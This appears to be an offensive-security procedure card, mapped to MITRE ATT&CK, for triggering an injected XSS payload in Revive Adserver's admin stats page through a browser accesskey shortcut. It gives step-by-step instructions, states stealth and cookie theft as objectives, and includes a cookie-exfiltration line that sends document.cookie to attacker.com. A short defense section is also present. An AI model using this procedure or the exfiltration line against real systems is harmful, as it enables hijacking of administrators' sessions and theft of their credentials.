---
id: proc-uuid-5678
tags:
  - xss-trigger
  - accesskey
  - javascript-execution
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:20.718Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-Execution-via-Accesskey

## Summary

This procedure activates the injected XSS payload in Revive Adserver by using browser-specific accesskey shortcuts to fire the onclick event, executing arbitrary JavaScript in the authenticated context for potential data exfiltration.

## Description

Following payload injection, the accesskey attribute (e.g., X) allows triggering the onclick without clicking, exploiting browser hotkey support. This targets Firefox (Alt+Shift+X) but varies by browser. The scenario assumes the victim has loaded the tainted page; execution can steal cookies via document.cookie or redirect to phishing sites. Outcomes include session hijacking if admin cookies are captured.

## Requirements

1. Victim has loaded the injected page in a supporting browser (e.g., Firefox)
2. Focus on the page for accesskey to register
3. No additional tools; manual interaction suffices

## Defense

Defensive measures and detection strategies:

- Strip or encode all HTML attributes on output to prevent event handler injection
- Disable or monitor accesskey usage in web apps; use WAF rules to block suspicious attribute patterns
- Browser-side: Train users on phishing; enable XSS auditors if available

## Objectives

1. Execute injected JavaScript in victim’s browser
2. Collect sensitive data like cookies or perform actions
3. Maintain stealth by avoiding direct clicks

## Instructions

### Step 1: Focus the Page

**Context**: Ensure the tainted page is active so the accesskey binds to the input element.

Navigate to or refresh the /admin/stats.php with payload; keep window focused.

> Page must render the hidden input with accesskey=X.

### Step 2: Press Accesskey Combination

**Context**: Simulate user interaction to trigger onclick, executing the JavaScript.

In Firefox: Press and hold Alt+Shift, then X (release after).

In Chrome/Edge: Alt+X (may vary; test browser compatibility).

> Alert fires with document.domain; replace alert() with exfil code like: new Image().src='http://attacker.com/?cookie='+document.cookie;

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- execution
- browser-exploit
